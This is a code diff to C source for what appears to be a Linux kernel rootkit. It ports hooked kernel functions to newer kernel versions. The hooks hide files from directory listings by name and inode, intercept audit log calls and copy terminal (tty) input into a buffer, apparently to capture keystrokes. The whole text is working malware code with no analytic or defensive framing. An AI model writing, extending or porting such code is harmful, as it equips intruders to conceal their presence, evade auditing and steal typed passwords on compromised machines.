@@ -726,16 +726,26 @@ static struct audit_buffer *m_audit_log_start(struct audit_context *ctx,
     return real_audit_log_start(ctx, gfp_mask, type);
 }
 
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6,1,0)
+static bool  (*real_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);
+static bool m_filldir(struct dir_context *ctx, const char *name, int namlen,loff_t offset, u64 ino, unsigned int d_type) {
+#else
 static int  (*real_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);
 static int m_filldir(struct dir_context *ctx, const char *name, int namlen,loff_t offset, u64 ino, unsigned int d_type) {
+#endif
 
     if (fs_search_name(name, ino))
         return 0;
     return real_filldir(ctx, name, namlen, offset, ino, d_type);
 }
 
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6,1,0)
+static bool  (*real_filldir64)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);
+static bool m_filldir64(struct dir_context *ctx, const char *name, int namlen,loff_t offset, u64 ino, unsigned int d_type) {
+#else
 static int  (*real_filldir64)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);
 static int m_filldir64(struct dir_context *ctx, const char *name, int namlen,loff_t offset, u64 ino, unsigned int d_type) {
+#endif
 
     if (fs_search_name(name, ino))
         return 0;
@@ -895,6 +905,13 @@ static ssize_t m_tty_read(struct kiocb *iocb, struct iov_iter *to)
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5,12,0)
         if (copy_from_user(ttybuf, buf, rv))
+            goto out;
+#elif LINUX_VERSION_CODE >= KERNEL_VERSION(6,4,0)
+        struct iovec *iov = iter_iov(to);
+        if (!iov || !iov->iov_base)
+            goto out;
+
+        if (copy_from_user(ttybuf, iov->iov_base, rv))
             goto out;
 #else
         if (!to->iov || !to->iov->iov_base)
